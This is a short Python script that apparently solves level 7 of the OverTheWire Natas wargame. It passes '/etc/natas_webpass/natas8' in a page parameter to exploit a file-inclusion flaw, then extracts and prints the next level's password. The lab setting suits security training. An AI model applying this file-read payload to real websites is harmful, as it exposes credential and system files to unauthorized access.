#!/usr/bin/python3

import requests
import re
import os


username="natas7"
password=os.getenv("natas_pass")
auth=(username,password)

url = "http://{0}.natas.labs.overthewire.org/".format(username)

url1 = url + 'index.php?page=/etc/natas_webpass/natas8'

response = requests.get(url1,auth=auth)

flag = re.findall("(.*)\n\n<!--",response.text)[0]

print(flag)